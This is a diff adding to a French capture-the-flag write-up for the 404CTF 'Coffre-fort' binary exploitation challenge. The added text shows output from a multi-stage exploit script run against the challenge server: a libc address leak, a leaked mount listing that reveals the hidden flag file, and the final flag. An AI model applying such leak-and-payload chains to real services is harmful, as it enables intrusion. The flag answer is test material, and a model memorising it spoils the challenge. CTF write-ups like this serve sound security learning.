@@ -475,7 +475,52 @@ A force de tâtonner, en lisant `proc/self/mount` on découvre le nom du fichier
 
 Après échanges avec le concépteur du challenge, ce bypass est possible à cause de l'implémentation en docker du chall et du "montage" du fichier, qui laisse une trace dans /proc/self/mount.
 
+```bash
+$ python3 coffre3.py REMOTE
+
+[+] Opening connection to challenge.404ctf.fr on port 30863: Done
+b"Bienvenue sur l'interface de connexion au Coffre-fort !\n\n- Veuillez saisir votre identifiant.\n"
+b'- Veuillez d\xc3\xa9sormais saisir votre mot de passe.\n'
+[+] First payload sent
+[+] Leak write leak : 0x7fdc7b24c0f0
+b"Bienvenue sur l'interface de connexion au Coffre-fort !\n\n- Veuillez saisir votre identifiant.\n"
+b'- Veuillez d\xc3\xa9sormais saisir votre mot de passe.\n'
+[+] Second payload sent
+b"Bienvenue sur l'interface de connexion au Coffre-fort !\n\n- Veuillez saisir votre identifiant.\n"
+b'- Veuillez d\xc3\xa9sormais saisir votre mot de passe.\n'
+[+] Third payload sent
+b"Bienvenue sur l'interface de connexion au Coffre-fort !\n\n- Veuillez saisir votre identifiant.\n"
+b'- Veuillez d\xc3\xa9sormais saisir votre mot de passe.\n'
+[+] Fourth payload sent
+b'none / tmpfs ro,relatime,uid=65534,gid=65534 0 0\noverlay /app/coffre-fort overlay ro,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/689/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/688/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/687/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/562/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/561/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/560/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/518/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/690/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/690/work 0 0\noverlay /app/contenu_ultra_secret_du_coffre_fort.txt overlay ro,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/689/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlay'
+1024
+```
+
+
 La méthode attendue (et plus logique mais je n'y ai pas pensé, voir plus bas), consiste à passer par un appel syscall à `getdents` pour obtenir une structure contenant des informations sur le répertoire choisi (dont le nom des fichiers).
+
+
+Maintenant, y'a plus qu'à lire le flag :
+
+```bash
+$ python3 coffre3.py REMOTE
+
+[+] Opening connection to challenge.404ctf.fr on port 30863: Done
+b"Bienvenue sur l'interface de connexion au Coffre-fort !\n\n- Veuillez saisir votre identifiant.\n"
+b'- Veuillez d\xc3\xa9sormais saisir votre mot de passe.\n'
+[+] First payload sent
+[+] Leak write leak : 0x7f7ab0fc20f0
+b"Bienvenue sur l'interface de connexion au Coffre-fort !\n\n- Veuillez saisir votre identifiant.\n"
+b'- Veuillez d\xc3\xa9sormais saisir votre mot de passe.\n'
+[+] Second payload sent
+b"Bienvenue sur l'interface de connexion au Coffre-fort !\n\n- Veuillez saisir votre identifiant.\n"
+b'- Veuillez d\xc3\xa9sormais saisir votre mot de passe.\n'
+[+] Third payload sent
+b"Bienvenue sur l'interface de connexion au Coffre-fort !\n\n- Veuillez saisir votre identifiant.\n"
+b'- Veuillez d\xc3\xa9sormais saisir votre mot de passe.\n'
+[+] Fourth payload sent
+b"404CTF{c3_c0ffr3-f0r7_n_357_p4s_tR35_f0r7}\n"
+```
 
 
 ### Some failures
